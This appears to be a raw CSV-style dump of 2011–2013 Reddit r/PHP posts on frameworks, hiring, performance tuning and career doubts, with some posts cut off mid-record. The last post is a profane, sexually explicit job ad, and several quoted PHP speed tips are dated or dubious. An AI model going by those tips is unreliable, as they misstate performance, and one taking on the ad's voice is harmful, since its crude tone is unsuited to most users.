1368908025.0,50,self.PHP,1eld2t,Why would anyone choose Laravel over Symfony or Silex?,67,17,29,http://www.reddit.com/r/PHP/comments/1eld2t/why_would_anyone_choose_laravel_over_symfony_or/,"So this will be a rant post as I am right now looking into Laravel and I'm coming from the Symfony/Silex world. I see many things that I would not want to have in any of my projects. Please correct me if I'm wrong.

Here is what I found and think about it:

* I can install it with __download__. Where is the composer.json with the dependencies? We have composer (http://getcomposer.org) why __not__ use it? The problem? What if I'm deep in project-development and laravel updates a security leak ... do I then copy my application in the next downloaded  version? Without composer, how do I get all the new cool libraries with already developed nice functionality in my app. Do I download them also? What if there is a new version ... get my point?
* I don't like tabs. I prefer spaces. That's my own problem, I know.
* Heavy use of statics and constants. Problem here: [hard to test, hard to extend](http://stackoverflow.com/questions/1185605/when-to-use-static-vs-instantiated-classes). What if part of my code needs to be setup differently. At runtime maybe ...? __SOLID, not so much__.
* __No guideline to write good architecture__. Just a ""put your code here and all will be fine"" mind setting I get. There is this bundles folder but the documentation does not state you should use them as first citizens to keep it clean. The same thing I criticize about Zend, there is nothing about how to use it the right way. I saw many projects of new developers, starting a fresh project with a framework and it was pain to read that code, but if they stayed on the framework-documentation they would just not know it better.
 

One good thing: Laravel uses Symfony/HttpFoundation. It wraps PHPs superglobals. Read the article of igorw about the [Value of HttpFoundation](https://igor.io/2013/02/03/http-foundation-value.html).

To state my point why I would from here on always choose a framework that uses best practices of our time with composer, components and vendors, and a guideline to get the fresh developers a good start over every hype:

The first page of Symfonys ""The Book"" about [Symfony2 and HTTP Fundamentals](http://symfony.com/doc/current/book/http_fundamentals.html). A introduction about what we are really doing here in PHP.

tl;dr: Use [Symfony](http://symfony.com/) if you don't know about architecture, yet. Use [Silex](http://silex.sensiolabs.org/) otherwise. Read the documentation. It helps becoming a better developer.",,False,,t5_2qh38,False,,,True,t3_1eld2t,http://www.reddit.com/r/PHP/comments/1eld2t/why_would_anyone_choose_laravel_over_symfony_or/,

i am currently writing a book on high traffic web architecture with PHP, and i am turning to the community to help me make the structure of the book, to ensure that i do not oversee any subject the community is actually interested in.


  Just a little background on me, i was the Lead Developer on **(NSFW)**Pornhub.com, and other website (all having more than 1Million visitor / day), you can find my IAmA [here](http://www.reddit.com/r/IAmA/comments/kf4be/nsfw_iama_former_lead_developer_of_pornhub_amaa/). I always took great pride in sharing my knowledge, but, as long as i was working over there, i was not allowed to speak of most of this.


  My knowledge spans  from backend architecture (using technologies such as Memcached, Redis, MySQL, Sphinx, Node.js, Apache, Nginx, Squid, Varnish, HTML5, Lighttpd, ...), PHP development (Frameworks, Scripting, PHP Internal, PHP extension writing, PHP SAPI, embedded PHP, ...), front-end development and optimization (though i am not a master at this, i know enough not to screw up, i have more skilled friends helping me on this part), and general development cycle geared for PHP (PHP Unit, Phing, Jerkins, XHProf profiling, ...).


I already have a couple of ""chapter"" totaling 50pages more or less, covering PHP profiling, server architecture, caching with Redis, PHP Application Architecture for high loads (very rough so far), and like the title says, am looking not to oversee any important part, so /r/php, if you have interest in such a book, what would you like to see in it?


p.s: I do not know yet how i will distribute this book, free is really tempting, but reality is it is a lot of work, and most likely i will have to sell it, but i'll make sure to think of [/r/php](/r/php) when the time comes. And if i never get to this point, i will probably release each chapter on a blog or something.",,False,,t5_2qh38,True,,,True,t3_mosdh,http://www.reddit.com/r/PHP/comments/mosdh/help_me_structure_my_book_on_high_traffic_web/,

1321985997.0,48,self.PHP,mlpeg,Having trouble finding qualified php web developers. Would like feedback!,62,14,165,http://www.reddit.com/r/PHP/comments/mlpeg/having_trouble_finding_qualified_php_web/,"I lead the development &amp; technology team for a mid-sized interactive agency in SoCal. We have a small team of developers and an entirely separate creative team who do front-end (html, css, javascript, flash, video, photography, etc.)

As a hiring manager, I'm having trouble finding qualified php web developers given our requirements. 

Here are the things that I care about, and I'll tell you this: I don't really read resumes, I really only care about the code samples. When I do look at resumes, I look mostly at education to see if you have at least a B.S. in Computer Science or related degree but that is not really important as having solid code samples that demonstrate the qualities in code that I'm looking for (but having a degree can put you over the edge if I'm comparing two similar candidates).

Here's what I'm looking for:

- You write code in PHP 5.3+ (no deprecated methods, etc.)

- You understand object-oriented programming (don't show me classes where you're still using var $x; where is the variable scope? inheritance, abstraction, etc. are your classes simply wrappers for php functions or a giant hub of functions?)

- You use or have used MVC's (such as codeigniter, kohana, cake, symfony, yii, etc. I don't care which, as long as you have demonstrable knowledge of the paradigm) -- I want you to be able to tell me what you like about fat controllers, lean models or lean controllers and fat models and why.

- You have an understanding of OOP design patterns such as factory, dependency injection, singleton, etc. You don't have to know them all, but if you know at least a couple that is great. Where does it make sense to use the factory pattern? The singleton pattern? There's a lot of objectiveness and opinions around these topics but that's fine--I want to know if you understand their uses and what they're good for.

- You understand data and information! You can write SQL queries, understand different types of joins, unions, sub-queries, foreign key constraints, etc. The ideal candidate understands the principles of database design and can build normalized tables and knows when de-normalization can be helpful. (This area, I feel like a candidate only at the minimum needs to understand up to joins, sub selects and foreign key constraint).

- What are the things you do to protect from SQL injection, CSRF, etc.? Do you sanitize all user inputs and outputs? 

- Do you also know JavaScript? (it's getting more and more difficult to do web development without knowledge of JavaScript) -- What frameworks do you use? jQuery? Do you understand AJAX/asynchronous calls?

- The web's getting very de-centralized and more and more websites/applications need to communicate with third-parties/vendors/web services/etc. 

Do you understand data formats such as JSON and XML? Have you integrated with third party software/API's? Do you know how request headers/bodies and response headers/bodies work? 

- Have you used a version control system such as SVN/Git?

Plusses but not required:

- Have basic knowledge of SEO in terms (are you generating dynamic pages by passing ids through the query string still?)

- Have basic knowledge of web analytics (if you understand JavaScript and asynchronous calls, this is a really a non-issue to me)

Code samples don't do's:

- Don't send your custom database wrapper class; I'd rather see your prepared SQL statements or examples of more complicated queries you have done that may include joins, etc.

- Don't send code with unsanitized SQL statements! 

- Don't send code ripped from another source

- Don't send code using deprecated methods

- Don't send code that lacks convention (are you using both camelCase for some variables and under_scores in another?, what about braces? do you use a familiar brace convention such as knf or allman?)

- No globals!

Code sample do's:

- Write a set of classes that demonstrate a pattern such as factory

- Demonstrate inheritance and extensibility

- Show how you would sanitize and validate user input

- Show how you would sanitize output from the screen that comes from user input

I'd love to hear feedback from you guys. Are these requirements too tough and unreasonable? If so, why? Where would you gauge yourself in lieu of these requirements?

Edit:

Thank you all, I am really appreciating the feedback and am taking no offense to it all as there is a lot of value here.

And now I want to make review of them. Sorry if I made a lot of mistakes, I just learning english :)

&gt; 1. If a method can be static, declare it static. Speed improvement is by a factor of 4.

This is a really good practice till you don't write unit-tests and don't use service-oriented patterns (IoC). You just can't write unit test for static method.

&gt; 2. echo is faster than print.
&gt; 3. Use echo’s multiple parameters instead of string concatenation.

If you are using echo or print so often then you are likely making some small personal page and you can choose what you want and not to think about speed of your code (this is just personal page that won't be visited by thousands of users each second). But if you are making big project then you will likely need abstraction wich will provide you Request and Response objects (this way you can easily work with cache like varnish and don't got wasted code with ob_* calls for example).

&gt; 4. Set the maxvalue for your for-loops before and not in the loop.

This is good advice and it doesn't matter what language are you writting with.

&gt; 5. Unset your variables to free memory, especially large arrays.

If you have big project then you will likely make use of OOP and, while you store your objects not in the global scope, you don't need to do it, because when object will have a zero count of references it will be removed from memory. But if you're making batch operations with hundreds or thousands of objects then yes, you need to use unset.

&gt; 6. Avoid magic like __get, __set, __autoload

Magic __get/set is evil, __autoload is good :) Using __get and __set will lead to losing of autocomplete and, of course, will make your code slower. But what about autoload - you can choose between it and require_once, this is just the matter of your choice, but I think code without any ""require""s are cleaner and more readable.

&gt; 8. Use full paths in includes and requires, less time spent on resolving the OS paths.

Use __DIR__ constant in your autoload file.

&gt; 11. str_replace is faster than preg_replace, but strtr is faster than str_replace by a factor of 4

My opinion that strtr in many cases is better just because I can pass array like [""i want to replace this string"" =&gt; ""to this string"", ...] and that's all :)

&gt; 14. Error suppression with @ is very slow.

You are writting bad code if you need to suppress errors

&gt; 17. $row[’id’] is 7 times faster than $row[id]

Again, this is error (e_notice), when you are writting $arr[key] you say that `key` is constant and PHP makes lookup for this constant, but when PHP don't find this constant you got a string ""key"".

&gt; 18. Error messages are expensive

Maybe they are expensive, but you should avoid them not because of this but because they are error messages, they letting you to know that you have an error

&gt; 20. Incrementing a local variable in a method is the fastest. Nearly the same as calling a local variable in a function.
&gt; 21. Incrementing a global variable is 2 times slow than a local var.
&gt; 22. Incrementing an object property (eg. $this-&gt;prop++) is 3 times slower than a local variable.

You are writting in PHP, not C, you just don't need this small optimizations.

&gt; 26. Methods in derived classes run faster than ones defined in the base class.

Ok then fuck inheritance, right? :)

&gt; 28. Surrounding your string by ‘ instead of ” will make things interpret a little faster since php looks for variables inside “…” but not inside ‘…’. Of course you can only do this when you don’t need to have variables in the string.

This is matter of choice, there's no big speed advantage of using '

&gt; 30. A PHP script will be served at least 2-10 times slower than a static HTML page by Apache. Try to use more static HTML pages and fewer scripts.

Yeah, it's slower to run some programm to get a response than to just get prepared response from a file.

&gt; 31. Your PHP scripts are recompiled every time unless the scripts are cached. Install a PHP caching product to typically increase performance by 25-100% by removing compile times.

Yes, you can install APC, XCache or whatever you want, this is good advice.

&gt; 32. Cache as much as possible. Use memcached – memcached is a high-performance memory object caching system intended to speed up dynamic web applications by alleviating database load. OP code caches are useful so that your script does not have to be compiled on every request

No, use memcached when you have so many cached items that you need to scale cache servers, but when you have just one server you will likely find using APC is much easier and a little faster.

&gt; 33. When working with strings and you need to check that the string is either of a certain length you’d understandably would want to use the strlen() function. This function is pretty quick since it’s operation does not perform any calculation but merely return the already known length of a string available in the zval structure (internal C struct used to store variables in PHP). However because strlen() is a function it is still somewhat slow because the function call requires several operations such as lowercase &amp; hashtable lookup followed by the execution of said function. In some instance you can improve the speed of your code by using an isset() trick.Ex.

Another one small optimization, that won't lead any noticable effect.

&gt; 34. When incrementing or decrementing the value of the variable $i++ happens to be a tad slower then ++$i. This is something PHP specific and does not apply to other languages, so don’t go modifying your C or Java code thinking it’ll suddenly become faster, it won’t. ++$i happens to be faster in PHP because instead of 4 opcodes used for $i++ you only need 3. Post incrementation actually causes in the creation of a temporary var that is then incremented. While pre-incrementation increases the original value directly. This is one of the optimization that opcode optimized like Zend’s PHP optimizer. It is a still a good idea to keep in mind since not all opcode optimizers perform this optimization and there are plenty of ISPs and servers running without an opcode optimizer.

Yes, for example we have a ""for"" loop:
    &lt;?php
    for ($i = 0; $i &lt; 1000; $i++)
        doSomething();

You know that $i++ is **post**-increment, but why you are need post-increment there, while you can make pre-increment and result will be the same.

&gt; 39. Make use of the countless predefined functions

Oh god yes. I see many of developers don't know about many of php's functions and write some extra code.

I'm going to write a detailed description of what goes on inside my server in order to help you with noticing potential issues. I'm very new to managing servers and am running an almost stock lamp-server on ubuntu 10.04 lts. Thank you for reading.

I've recently built a simple system that manages flash(and soon html) banners for our clients, it's based on codeigniter and uses mysql.

We are renting a VPS ""cloud"" server at rackspace (8 gb ram at the moment for safety) and we are currently serving around 140 requests per second(highest I've seen this week, 84 as of a minute ago), this translates in roughly sub 2 million views of our banners per day.

When the client updates the data inside of a banner, the data goes to the mysql backend and gets written into an xml file.

When a visitor views a swf banner, the banner requests a relevant xml file, parses the xml file, then requests the images and displays it all. The swf then sends a straight get request with it's own id and the page the swf is being displayed on back to my server. This request gets caught by a single file, which uses PDO to make an INSERT into mysql, and a view is created(each view has it's own row, with 3 cells: banner id, timestamp, url), no data is sent back to the swf. A similar thing happens when a click event is triggered inside of a banner.

I've been spending the last few nights optimizing and am wondering if there is anything else I can do.

Stuff I've already done: 

* apache: set keepalive off, increased the maxclients(and other) stuff to spawn more servers, I'm not entirely convinced it's all correct, here's my apache2.conf http://pastebin.com/0uA2SiDU I know it's not pretty, but I don't even know which of the ifmodules is being read, that's how new I am to this
* mysql: disabled persistent connections
* code: taken out the insert view script from codeigniter and made a separate file for it, so 1 file does everything, just a straight pdo connect, data cleaning, pdo execute, pdo connection = null, die();
* mysql: ~~taken out id(with auto_increment) from the views table as I've read that this becomes pretty performance intensive when you start reaching 6-7 digit numbers with my number of writes per second~~


This will probably be useful:

* htop 16 minutes after server start: http://i.imgur.com/5fIcV.png
* htop 32 minutes after server start: http://i.imgur.com/xddvd.png
* htop 46 minutes after server start: http://i.imgur.com/C2HUs.png
* apache2ctl -M http://pastebin.com/GFghA8Fu

The above stats are with roughly 90 requests per second in apache.

One thing that really annoys me: Say the server is doing 100 requests per second and is eating 3 gb of ram (physical memory used), I then do a full server restart, an hour later the server is doing 120 requests per second, but it's now eating 1.5 gb of ram, 24 hours later it's serving 80 requests per second and eating 4 gb of ram. Restart, same story all over, what gives?

**so, any tips, what should I be doing/learning/working on?**

Thank you for reading and for the advice, btw if you're anywhere near Old Street or Hoxton square in London and wanna chat, send me a pm, let's go for a pint.

**edit: formatting, added apache2ctl -M**

**edit 2: with your help, I've just more than halved the memory usage (APC ftw, thank you StuartGibson) and am on my way to improving the application (offloading static assets to Cloud Files and using the access log for statistics). I am now going to sleep as I have to wake up in 5 hours to go to work, but I will run through unanswered suggestions first thing tomorrow morning. Thank you so much.**


**edit 3: with apc and all the optimisations mentioned above, I'm currently running 82 requests per second at 444 mb of ram(yesterday, 80 requests cost about 2gb). Thank you all.

Looping 100,000 times using an echo statement with 5 instances comparing concatenation vs passing multiple arguments to echo, I used microtime(), memory_get_usage(), and memory_get_peak_usage() to measure how long it took and how much memory it took each way.

Microtime returns a [unix time stamp](http://php.net/manual/en/function.microtime.php) in microseconds.  I tested this on my local development setup (WAMP on Windows 7) and on a budget VPS as well, just to ensure my local machine was not skewing results.

On my local machine averaging several tests together provides the following results:

    Periods          Commas         Difference
    0.107409418      0.084699512    0.022709906

Given that this represents a truly staggering amount of this type of problem, I don't think I'd ever find a ""real world"" case where this result is even relevant.  Even here though, we would need 50x the loops for the difference to amount to one second.  I'd have run the loop 1,000,000 times but honestly it just about crashes my browser.

What about on an actual server though?  This is where things get more interesting:

    Periods          Commas         Difference
    1.461359978      1.459618509    0.001741469

Here we see even less of an improvement, if you can call .001 an improvement at all.  It quickly became obvious that the results were too volatile to have much meaning.  That is, something else was a larger influence on the execution time to the point where the test results are meaningless.

For the memory testing, I was looking at memory_get_usage() to determine if something odd was going on with such a fringe case.  In other words, was php allocating memory and not releasing it etc.  I found that each version of the script displayed the exact same memory usage at the end of the script.

While it is true that the version with the commas used less memory, the ""benefit"" was 16 bytes.  Yes, you read that correctly, 16 bytes.  This, like the speed increase is almost immeasurable.

This is why you do not bother with ""micro optimizations"".  At the end of the day they have no relevance in the real world even if you can demonstrate that they are theoretically faster.  The *only* deciding factor in this case on which style you use, is which you prefer.  I don't think that you can rationally argue that there is any significant performance benefit, unless you can demonstrate some flaw in the way I've tested it.

If you want to make your code faster, I'm all for that.  Use Xdebug / KCacheGrind and find out where your script is the slowest and start there.  I can guarantee you that its not here.

For years, I had been coding PHP on the side, trying to learn because I had some cool ideas and my thought has always been ""If I can make it exactly how I want it to be, then I'm going to"" instead of ""I'll look around and see what I can find and settle on something that has most of the features I'm looking for.""

A few months ago, I got a full time job as a PHP developer.  I was completely honest telling them that I didn't have a lot of experience with PHP, but I knew enough to get me going.

I was tasked with creating a huge CMS system from scratch basically, and dove right in.  I wasn't sure exactly what I was getting myself into.

I realized quickly that there was a lot more to PHP than meets the eye.  A few months before I had gotten this gig, I had just learned the importance of PDO, and barely had a grasp of functions and arrays.  Needless to say, I was a little in too over my head.

As I got going though, it became easier and easier, but I still felt held up by the fact that it seemed to be taking much longer than I had hoped for.  I tried to put everything in functions, but I just kept going back and changing the function to add or remove different things I needed for it to do.

You could say that while I was developing this software, I was also developing a framework to develop the software.  It was not a good combination at all, and the code was all over the place.

One weekend, I had nothing to do, so I told myself I was going to get into learning a framework.

I had found one that I liked that has great documentation, and I began scouring the internet for resources to learn it.

After a few hours of watching videos and messing around, I was amazed.  It felt like I was learning PHP all over again.

At first it was a weird feeling.  There was a lot of configuration to do when first setting up your new application, there was a lot of time still looking in the documentation for the answer.

The only difference this time from learning PHP from scratch to learning a framework, is everything had been thought of already.

In the past few days, I decided to reboot my efforts on the software I was creating and use the framework I found to recreate the application.  At first it was kind of weird because it was weird for me to use these functions that someone else wrote and unless I was to go through all of the source code, I basically had to trust that they knew what they were doing.  Development is going amazingly quickly, and I feel more confident about the code I am writing than I was when I first started the project.

--------------------------------------------------------------

I believe that the way to get the most out of the framework is to find one that works for you, not one that you are struggling with.  The beauty of PHP frameworks is that they are a dime a dozen, there are many for every level of programmer you are out there, and even if you are just starting or you are just doing some work on the side, they will help you code like you've been doing it for year.

You need to trust the framework, especially if it has been out for a long time and it is very active, because these are created by people that once went through the same frustrations you did and decided to do something about it to make it easier on themselves and other fellow coders.

I just thought I'd give a little insight of how I came about using a framework.  I know it's tough to pick up at first, but once you find one you're comfortable with, it will be hard to code without using one.

**TL;DR: Frameworks are made for fellow programmers who are frustrated by the same nuances you are.  They were created to help you, even though at first it might not seem like it.  Take a day to find one you are comfortable with, and play around with it for a few hours to see if you like it or not...there are 100's to choose from**",,False,,t5_2qh38,False,,,True,t3_kdzqr,http://www.reddit.com/r/PHP/comments/kdzqr/why_should_you_use_a_framework/,

Sure, it'd nice if the application uses UTC and stores everything in the database in UTC, but if the database timezone is not in UTC, you'll still get some odd behavior when daylight savings time comes around (or if the database server is ever changes timezones).

I was about to write some code for a project to set the timezone on MySQL, but it seems as though this problem should already have been solved. 

PHP community: with frameworks, database abstraction layers, and ORM: Are there any standard ways in the system you use for dealing with this? If not, how do you work around this potential issue regarding the application and the database timezones?

1346868248.0,45,self.PHP,zejrq,Why bother with Zend Framework 2?,60,15,30,http://www.reddit.com/r/PHP/comments/zejrq/why_bother_with_zend_framework_2/,"At one point in time, I pretty much exclusively built ZF1 apps, and became pretty proficient and fast with it. Like most others, I ran into major performance problems with a couple of websites that had a lot of traffic and did the old ""cache the hell out of everything"" to get around the actual core performance issues. So needless to say, I've been anxiously awaiting the release of ZF2 for the past two years.

About six months ago I got sick of not using namespaces and closures and finally dove head first into Symfony2 land. Although it does a little bit more than I want an MVC framework to do, the amount of time it has saved with sensible default settings, built in security, and truly modular code has been absolutely revolutionary to my development process. 

Not only is Symfony2 performant and taking advantage of new PHP features (some bundles are already using traits), but it's been stable for over a year now so it has a nice set of community contributed bundles that are as simple as it could get to plug into your code. 

With Zend Framework 2 now being released I find I'm completely unmotivated to invest more time learning another MVC framework that appears to accomplish the same set of goals that Symfony2 has already covered.

Are there redeeming reasons to look at Zend Framework 2 as an alternate to Symfony2?

*Disclaimer: Yes, I know other frameworks are out there that have embraced these same goals even before Symfony2 came out, however, I am picking out ZF and Symfony specifically because they both appear to have the largest community and are driven by an actual commercial development shop.

	$sql = 'INSERT INTO `users` (`username`, `password`, `expires`) VALUES(""uname"", ""pswd"", 123987123)';

As you can see, the first loop runs an INSERT query at each iteration whereas the second one waits until there are 100 elements in the array to query the database.

The results were astonishing : The first loop took 1208 seconds while the second took only 38, without using much RAM. I ran this on PHP 5.3.5 on a netbook with 1 GB of RAM and a 1.67 Ghz Atom processor.

Let me preface this by saying I am not a seasoned PHP developer.  I have built a few sites in the past using Zend Framework 1.x, CI, and of course plain PHP.  I have spent the last ~5 years programming ('professionally') with JS (front-end, and node backend), Objective-C, and AS3.


I am now moving into taking over backend development in my (very small) company for our main products which are very high traffic and pretty data intensive that face continual scaling.  We are an Apache / PHP 5.3 house using MySQL, MongoDB, Reddis, and NodeJS.


We are looking to move away from Zend, but still staying with the existing stack.  So in researching the various FOTM frameworks and going through their documentation, I see they have all largely adopted using ORMs.  While I have never used a PHP ORM (outside of briefly learning things like symfony/laravel), I have used things like Core Data for iOS apps which, while not exactly an ORM, is a pretty similar concept for most use cases.


So while I'm on board with switching away from ZF, I just can't get past the ORM side... but when I see the world around me adopting it, I can't help but wonder if maybe I'm just being stubborn.  **Can anybody here help convince me why I should use something like Doctorine over writing raw queries?**


The other developer here, who will be writing the majority of the queries, is near a mad genius at databases and has really managed some amazing stuff using even just MySQL, so I don't feel like I need the helping hand that ORMs seem to be.  From a performance stand point, I could find very little on ORM benchmarks (I found one from 2011 and it showed ORMs far behind standard queries through PDO).

If someone were to create a competitor for it, what features and behaviors would you expect that site to have?

I'm not saying I'm doing this (I've got too much on my plate already), but I'm curious what sorts of things people would like to see, and maybe someone who _does_ have the time and resources could put that list to use.

I'll throw out a few I thought of:

- No registration required to download from the site, and very simple registration needed for participation.

- Github and BitBucket integration, there's actually no reason for the site to host any files at all.  Tie user accounts into OAuth and you've solved the registration problem.

- Copy the reputation system from StackOverflow, granting higher privileges as members participate more in the site.

- Peer reviewed articles.  Create a queue system, drafts are submitted by authors and reviewed by the community.  Members of sufficient reputation vote on if the article is factually accurate and worthy of publishing to the front page.

- Tagging for what a library is (data model, API wrapper, etc), its class implementation (abstract, interface, trait), minimum version (5.x, 5.2, 5.3, 5.4) and other common groupings (database, ACL, REST).

- ~~A packaging API could be very useful, lets replace PEAR while we're at it.~~ Support for a packaging system such as Composer/Packagist. (Several good points made against implementing one itself).

with using CMS's for customers?",57,14,72,http://www.reddit.com/r/PHP/comments/pphr4/am_i_the_only_one_who_has_had_terrible/,"A fairly constant montra I see around here is ""learn a framework/CMS, and customize that to fit"".

I've been doing PHP development professionally for 8 years, and even more as a hobby. My experience, with both sides of this question, has been slightly different. While using a CMS has been useful when a client needs to frequently update content, I've often found that no matter which CMS I learn (and I've learned many) the customer requirements are often prohibitively expensive to implement inside of a CMS as opposed to a custom built project.

Sometimes this is related to the database structure, other times it's related to various kinds of sandboxing that ""protects"" me from accessing areas of the CMS. Excuse me, but if I'm in the code creating applications, I either know what I am doing, or I shouldn't be in the code.

Overall, I've found that on projects of greater than about 12-15 hours, the time savings of a CMS are offset by the requirements clients often desire.

Is this an artifact of the clients I've had over the last 8 years? Am I just an abberation? A CMS has a place, and I still use them where I think they are appropriate... adding a blog section to a website usually means installing Wordpress instead of creating some homegrown solution... but beyond the incredibly generic requirements, CMS's seem to take more time than they save, and create additional work that the clients often do not want, or do not want to pay for.",,False,,t5_2qh38,False,,,True,t3_pphr4,http://www.reddit.com/r/PHP/comments/pphr4/am_i_the_only_one_who_has_had_terrible/,

The reason was due to a fairly large update that I've made to the site. I completely redid the styling and added a few really nice features. 

If you check out Codetique now, you will notice that the site looks completely different. Gone is the old blue logo and blue/grey blob favicon. In favor of a much more professional look. I need to give credit to Nicoon for coming up with the icon. 

Also the front page is once again the review creation screen, and you will now notice that you can create reviews from a few third party sources. Just paste a link to either a pastebin paste, github gist, or github file and select that source from the radio buttons. That will grab the code and put it to the text area, so you wont have to manually copy it.

The search page has been moved to the ""All Reviews"" page, and you can now add a keyword to your search if you want to find code examples. 

Commenting is still exactly the same as before. I will say I'm not completely happy with the way comments appear inline in the code and am working on it. If you have any design suggestions to clean that up I would love to hear them. 

On the actual review screen there are a few buttons in the title to post to twitter, facebook, or reddit. If you have any other places you might want to post a review, I will be happy to add them.

That's about it. I hope you guys like the new look, I'm not a designer but I think it turned out pretty well and looks a lot better than previously.

Here is the link: https://codetique.com 

As always let me know what you think.

When I am dealing with large numbers of cases/bugs my code quality suffers because I am not a good ""multi-tasker."" I like to work on one project at a time with few interruptions. My code quality certainly suffers as the amount of things in my brain increases. Lately I've found that I cannot handle the stress of being a programmer any more.

--------------

Morning folks,

I'm an employed PHP developer and I use PHPStorm. It's a great IDE, full of all kinds of lovely but I've always known that I don't leverage a tenth of what it can do. Like a dull toothache you forget to tell your dentist, it's there in the back of my mind that using PHPStorm properly can make me a better developer.

My problem is that I know my working practices are poor - really poor. I might as well be using notepad for all my developing. Here's a list of things I don't do (despite having used, or got knowledge of)

* I don't use version control
* I don't develop locally
* I don't unit test
* I don't use build and deploy solutions (such as Phing)

In other words, I use PHPStorm as a glorified text editor - and that's coo', I can keep trundling along this path but it's not what I want. I made one silly resolution this year and it was to actually develop a project ""properly"" and leverage my IDE into making me a better developer.

I know how to use git and hg; I know about Phing and other build &amp; deploy methods and I know I should develop locally and ""never touch the live server"". I know what unit testing is and how to use it - but not in PHP.

So I began investigating and it turns out that no-one has compiled a nice ""here's how to setup a project that uses git, develops locally, publishes remotely, has unit testing"" type guide.

As I understand it, my working practice should be:

1. Develop a project locally
2. Use unit testing were appropriate - locally.
3. Commit changes to git
4. When changes are solid, and my agile sprint is complete - push to live server

If anyone here uses PHPStorm and has some of these things going on their projects, can you comment and let me in on the secret to configuring the IDE to use these features? Where does Phing fit into my numbered list above?

I wrote this library as a hobby a while back. Since I was not completely happy with it, I recently decided to rewrite some portions of it. I commited the changes and now I would love to hear some critique or suggestions from other fellow php coders.

I have almost three years of experience writing PHP. It was kind of easy to learn because I had done a lot of C before and its syntax similarity helped. I have been developing a project for a scholarship for almost five months. I coded everything from scratch (db access using PDO, OOP for each component, and so on..) and it just... works...

A week ago I was the kind of guy that used to think that frameworks + CMS were for pussies because I know people that lacks of knowing how to write raw PHP code that deploy websites in weeks using Joomla for example (not a pure framework but you know what I mean). Boy how wrong was I... I've been this whole week playing with CodeIgniter, Symfony and ZF and now I feel like I've wasted my time, that I was doing EVERYTHING WRONG. No MVC, no routing,... Now I look back to my code and it looks like a mess, spaghetti code all around..

The problem is that this project is intended to be used in the college. Maybe within a year another person will have to deal with my code to add new features, and this guy/gal will probably want to kill me. Now I've got some weeks left and I really feel like I have to rewrite everything, despite the fact that the application is now in 'beta'.

Should I do it?

So I've got a lot of experience programming PHP - I've written full websites with loads of procedural elements. I'm good with a lot of nitty gritty work, and can usually find ways to get the job at hand done without needing to get external help. I'm in no way a PHP master, but I consider myself a fairly talented and crafty programmer. Something I've never been able to wrap my head around however is Object Oriented programming. Something about the way it works just doesn't seem to click in my head.

I've written a full website and panel using CodeIgniter, which was my ""Introduction"" to OO programming. Still, it felt as if I was using procedural programming within an OO framework and I didn't learn much. If you were to really ask me what classes, functions, and $this was in regards to OO PHP, I wouldn't be able to tell you.

My question is, are there any decent tutorials, classes, or general tips you might be able to give / link me to for learning about Object Oriented programming?

I'm afraid of getting rejected/ridiculed due to my lack of work experience. I have worked with a lot of procedural programming but not much OOP (just starting to learn) and I also lack any formal programming education (self-taught, learned by trial and error). I don't have any friends who program so I haven't had anyone around to tell me whether I'm doing something wrong or not (or even someone to talk to about programming, for that matter).

The only thing I've been using is Notepad for all of my web development work and I've never touched a framework before (though people have suggested that I should try drupal or wordpress). I've programmed communities this way, one of which had over 10,000 users at one point (if that's worth noting at all). Because I've spent much of my time working on online communities I've also learned how to work with MySQL and relational databases (right now I'm developing nabyn.com).

I consider myself to be at an intermediate level where I can make more than what the average beginner can but perhaps not up to par with industry standards. For example, if you were to ask me to program an image board or a community I don't think I would have too much trouble with it (depending on the scale of the project).

- Lack of Formal Programming Education

- Lack of a College Degree

We're an established, and very well-known adult porn company here in Dallas, TX. We are interviewing and hiring immediately for a proven web developer to work full time in our offices near George Bush Turnpike and Preston. Work hours are 9 - 5, Monday-Friday. Sorry, no telecommuting!

Candidate must posses strong knowledge of PHP. You will be in charge of developing troubleshooting new and existing solutions for your day to day responsibilities. You will work closely with an off-show designer and programmer (the programmer does all the heavy PHP coding from his home in Bulgaria).

This is a front and back end web developer position. You MUST know how to take a design from PSD, and quickly convert it into a working website. While we frown on tables, we're more interested in making money than doing what W3C thinks is best.

You will interact with affiliates and answer their questions, and resolve their website issues.

You will come in and will be trained by the departing developer (me). I have created many custom programs to streamline the work day and to lessen my workload. Once I leave, you will have complete control to run the technical side of the business as you see fit (with input from the owner).

** THIS IS AN ADULT COMPANY ** There is PORN involved.

Do you like to browser /r/nsfw during business hours and look at the stuff in a tiny 5px x 5px window so you won't get caught? NO ONE GIVES A FUCK ABOUT THAT HERE. We're a PORN company. You MUST understand this. ALSO: ~80% of our cash comes from the GAY side of porn. You don't have to be gay, but if the thought of TWO OR MORE GUYS FUCKING AND SUCKING DICK bothers you, do NOT bother replying.

I'm straight, and for the first few weeks it bothered me a little, but honestly all I see now is $$$.

We also have STRAIGHT sites/networks. You are free to jerk off to the content all you want (outside business hours, please!).

BENEFITS:

1. Extremely relaxed environment. You will be asked to wear a polo shirt and jeans/khakis for the first few weeks. After you settle in and get to know everyone, GO HOG WILD. Come in in tattered shorts and flip flops if you want. Who gives a shit - we're not hear to criticize your clothing, we're here to make money!
2. FREE PORN!
3. The owner likes going to the gym every single day and playing raquetball for an hour. Are you a lard ass that wishes he could lose some weight? He'll probably pick up your gym tab after your first month or two here, and make you sweat, sweat, sweat! You WILL lose weight!
4. The owner owns a BBQ restaurant, and likes to go to BBQ competitions (the season is about to start again!). Do you like BBQ? Do you like SLOW SMOKING brisket for 12 hours?? If you do, he'll probably ask you to tag along and enjoy some CASH PRIZES because our fucking cooking is so GODDAMNED GOOD we've won 1st prize brisket 80% of the time we've competed! Fuck we're good! Our honey-glazed RIBS &amp; cripsy-skinned chicken have done really well, too! You don't have to go if you don't want to, ya pansy.
5. Your own office! With a window! Get the fuck outta that rat-sized cubicle! I HAVE 3 MONITORS ON MY DESK AND NO ONE SAYS A SHIT BECAUSE IT'S ALL ABOUT $$$.
6. FREE PORN. Are you a nerd who never got laid and needs to go to xtube to jack off? Well, fuck you, come and take a look at our &gt; 5TB collection!
7. You get to decide how to advance your position! No one here will tell you your plans are too far-out. We have problems that arise every now and again, and YOU will decide how to go about fixing them. Use your nerd cred and make your e-peen larger.

Men/women are welcome to apply. NO ONE UNDER 18. Fuck you kids, this ain't a playground!

We are 100% LEGIT. Been in business for over DECADE. Position is SALARY, paid TWICE A MONTH. Never missed a paycheck - EVER!

BONUS: every now and again we get pornstars coming to our offices and hanging out. You're welcome trying to get laid, but you'll probably get laughed down. Haha!

